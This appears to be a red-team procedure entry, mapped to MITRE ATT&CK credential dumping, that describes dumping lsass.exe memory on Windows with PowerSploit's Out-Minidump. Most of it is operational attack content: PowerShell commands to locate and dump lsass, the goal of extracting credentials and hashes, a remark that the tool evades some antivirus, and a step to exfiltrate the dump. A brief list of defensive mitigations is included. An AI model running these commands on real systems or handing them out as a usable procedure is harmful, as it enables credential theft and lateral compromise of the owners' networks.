---
id: 8b003bc1-d0f3-468f-9079-293dba6d6c6a
name: dump-process-memory-powershell
type: procedure
verified: true
submitted: false
created_at: '2020-01-02T19:41:41.041387+00:00'
updated_at: '2023-05-25T19:54:29.827940+00:00'
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - '[[techniques/Data from Local System|T1005 - Data from Local System]]'
  - '[[techniques/OS Credential Dumping|T1003 - OS Credential Dumping]]'
sub_techniques: []
tags:
  - data-exposure
  - memory
commands:
  - '[[commands/get-process-list-running-processes]]'
  - '[[commands/out-minidump-dump-memory-of-process]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerSploit]]'
skill_level: advanced
impact_level: high
detection_risk: high
validated: true
---

# dump-process-memory-powershell

## Summary

This procedure uses PowerShell and PowerSploit's Out-Minidump to dump the memory of a running process (e.g., lsass.exe) on a Windows target, capturing credentials and encryption keys for offline analysis.

## Description

Process dumps via minidump format allow extraction of in-memory secrets without killing the process. PowerSploit evades some AV by using native APIs. Run from WinRM shell for remote execution.

## Requirements

1. Administrative access via shell
2. PowerSploit downloaded (Out-Minidump.ps1)
3. Write access to output directory

## Defense

- Enable LSA Protection and Credential Guard
- Monitor for PowerShell dumps (Event ID 4688 with Out-Minidump)
- Use EDR to block unsigned scripts

## Objectives

1. Capture process memory
2. Exfil dump for analysis
3. Extract creds/hashes

## Instructions

### Step 1: Import Module

**Context**: Load Out-Minidump in PS session.

. .\Out-Minidump.ps1

> From WinRM shell.

### Step 2: List Processes

**Context**: Identify target like lsass.

**Command** ([[commands/get-process-list-running-processes]]):
```powershell
Get-Process | Where-Object {$_.ProcessName -like "lsass"}
```

> Note PID.

### Step 3: Dump Memory

**Context**: Pipe process to dumper.

**Command** ([[commands/out-minidump-dump-memory-of-process]]):
```powershell
Get-Process -Name lsass | Out-Minidump -DumpFilePath $_OUTPUT_PATH
```

> Creates .dmp; exfil with upload.
